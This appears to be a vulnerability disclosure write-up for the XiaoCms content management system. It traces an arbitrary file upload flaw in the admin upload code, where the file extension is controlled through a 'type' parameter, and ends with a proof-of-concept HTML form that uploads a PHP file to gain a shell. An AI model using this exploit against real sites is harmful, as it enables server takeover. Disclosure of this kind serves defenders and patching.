# GETSHELL
----------------------
Vulnerability code is located `XiaoCms\admin\controller\uploadfile.php`,take a look at the upload function.
![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/GETSHELL_1.png)
You can see a series of operations that define the upload ext, where the set_limit_type and upload functions are called at the line.
![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/GETSHELL_2.png)
You can see that upload also calls the parse_init function, which is also located in `upload.class.php`.
![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/GETSHELL_3.png)
Calling a key get_file_ext in the function, also on this page.
![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/GETSHELL_4.png)
At this point, our code is basically analyzed, we can see that there is a logic error in the layer call. Although the file suffix is restricted, it is controllable by the attacker, so we only need to set the type to php.

POC：
```
<html>
    <body>
    <form action="http://127.0.0.1/admin/index.php?c=uploadfile&a=uploadify_upload&type=php&size=1000" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="submit" />
    </form>
</body>
</html>
```
![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/GETSHELL_5.png)
![](https://github.com/AvaterXXX/XiaoCms/blob/master/image/GETSHELL_6.png)
